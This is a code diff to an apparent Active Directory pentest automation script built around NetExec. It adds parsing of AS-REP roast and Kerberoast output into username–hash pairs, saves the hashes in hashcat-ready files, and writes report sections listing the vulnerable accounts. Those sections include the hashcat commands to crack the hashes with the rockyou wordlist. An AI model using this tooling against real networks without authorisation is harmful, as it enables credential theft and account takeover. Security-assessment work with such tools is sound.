@@ -236,6 +236,61 @@ def save_users_to_file(users, auth_user, target):
     
     return filename
 
+def parse_hashes_with_users(output, hash_type):
+    """
+    Parse roasting output to extract user-hash mappings.
+    hash_type: 'asrep' or 'kerb'
+    Returns list of tuples: [(username, hash), ...]
+    """
+    user_hashes = []
+    
+    for line in output.split('\n'):
+        if hash_type == 'asrep':
+            # AS-REP hash format: $krb5asrep$23$username@DOMAIN:hash...
+            match = re.search(r'\$krb5asrep\$\d+\$([^@]+)@', line)
+            if match:
+                username = match.group(1)
+                # Extract the full hash from the line
+                hash_match = re.search(r'(\$krb5asrep\$[^\s]+)', line)
+                if hash_match:
+                    user_hashes.append((username, hash_match.group(1)))
+        
+        elif hash_type == 'kerb':
+            # Kerberoast hash format: $krb5tgs$23$*username$DOMAIN$service*$hash...
+            match = re.search(r'\$krb5tgs\$\d+\$\*([^$]+)\$', line)
+            if match:
+                username = match.group(1)
+                # Extract the full hash from the line
+                hash_match = re.search(r'(\$krb5tgs\$[^\s]+)', line)
+                if hash_match:
+                    user_hashes.append((username, hash_match.group(1)))
+    
+    return user_hashes
+
+def save_hashes_with_users(user_hashes, hash_type, target):
+    """Save hashes in hashcat-ready format with usernames in filename."""
+    if not user_hashes:
+        return None
+    
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    target_clean = target.replace('.', '_')
+    
+    # Build filename with all usernames separated by __
+    usernames = [username for username, _ in user_hashes]
+    users_part = "__".join(sorted(set(usernames)))
+    
+    if hash_type == 'asrep':
+        filename = f"{users_part}_asrep_hashes_{timestamp}.txt"
+    else:
+        filename = f"{users_part}_kerb_hashes_{timestamp}.txt"
+    
+    # Write only hashes, one per line, ready for hashcat
+    with open(filename, 'w') as f:
+        for _, hash_value in user_hashes:
+            f.write(f"{hash_value}\n")
+    
+    return filename, len(user_hashes), usernames
+
 def check_responsiveness(output, require_auth):
     """
     Analyze NetExec output to decide whether to continue with flags.
@@ -315,6 +370,8 @@ def main():
     # Track findings for final recommendations
     all_writable_shares = []  # Shares with WRITE permission
     all_discovered_users = []  # Users from rid-brute
+    all_asrep_hashes = []  # AS-REP roastable users and hashes
+    all_kerb_hashes = []  # Kerberoastable users and hashes
     
     # Define auth modes to try when no credentials provided
     if require_auth:
@@ -387,6 +444,24 @@ def main():
                         all_discovered_users.extend(users)
                         print(f"\033[1;33m[!] Discovered {len(users)} users via RID brute\033[0m")
                 
+                # Track AS-REP roastable hashes with users
+                if "--asreproast" in flag:
+                    asrep_hashes = parse_hashes_with_users(output, 'asrep')
+                    if asrep_hashes:
+                        all_asrep_hashes.extend(asrep_hashes)
+                        print(f"\033[1;33m[!] Found {len(asrep_hashes)} AS-REP roastable users\033[0m")
+                        for username, _ in asrep_hashes:
+                            print(f"\033[1;33m    - {username}\033[0m")
+                
+                # Track Kerberoastable hashes with users
+                if "--kerberoasting" in flag:
+                    kerb_hashes = parse_hashes_with_users(output, 'kerb')
+                    if kerb_hashes:
+                        all_kerb_hashes.extend(kerb_hashes)
+                        print(f"\033[1;33m[!] Found {len(kerb_hashes)} Kerberoastable users\033[0m")
+                        for username, _ in kerb_hashes:
+                            print(f"\033[1;33m    - {username}\033[0m")
+                
                 # If Kerberos flag failed due to clock skew, retry with faketime
                 if is_kerberos_flag(flag) and has_clock_skew_error(output):
                     print(f"\033[1;33m[!] Clock skew detected. Attempting time sync...\033[0m")
@@ -406,6 +481,36 @@ def main():
                 f.write("**User list:**\n```\n")
                 for user in sorted(set(all_discovered_users)):
                     f.write(f"{user}\n")
+                f.write("```\n\n")
+        
+        # Save AS-REP hashes with user attribution
+        if all_asrep_hashes:
+            result = save_hashes_with_users(all_asrep_hashes, 'asrep', target)
+            if result:
+                hash_file, count, usernames = result
+                print(f"\n\033[1;32m[+] AS-REP hashes saved to: {hash_file}\033[0m")
+                f.write(f"### AS-REP Roastable Users\n\n")
+                f.write(f"> 🔓 **{count} AS-REP roastable accounts** found and saved to `{hash_file}`\n\n")
+                f.write("**Affected users:**\n")
+                for username in sorted(set(usernames)):
+                    f.write(f"- `{username}`\n")
+                f.write("\n**Crack with hashcat:**\n```bash\n")
+                f.write(f"hashcat -m 18200 {hash_file} /usr/share/wordlists/rockyou.txt\n")
+                f.write("```\n\n")
+        
+        # Save Kerberoast hashes with user attribution
+        if all_kerb_hashes:
+            result = save_hashes_with_users(all_kerb_hashes, 'kerb', target)
+            if result:
+                hash_file, count, usernames = result
+                print(f"\n\033[1;32m[+] Kerberoast hashes saved to: {hash_file}\033[0m")
+                f.write(f"### Kerberoastable Users\n\n")
+                f.write(f"> 🔓 **{count} Kerberoastable accounts** found and saved to `{hash_file}`\n\n")
+                f.write("**Affected users:**\n")
+                for username in sorted(set(usernames)):
+                    f.write(f"- `{username}`\n")
+                f.write("\n**Crack with hashcat:**\n```bash\n")
+                f.write(f"hashcat -m 13100 {hash_file} /usr/share/wordlists/rockyou.txt\n")
                 f.write("```\n\n")
         
         # Slinky recommendation if writable shares found
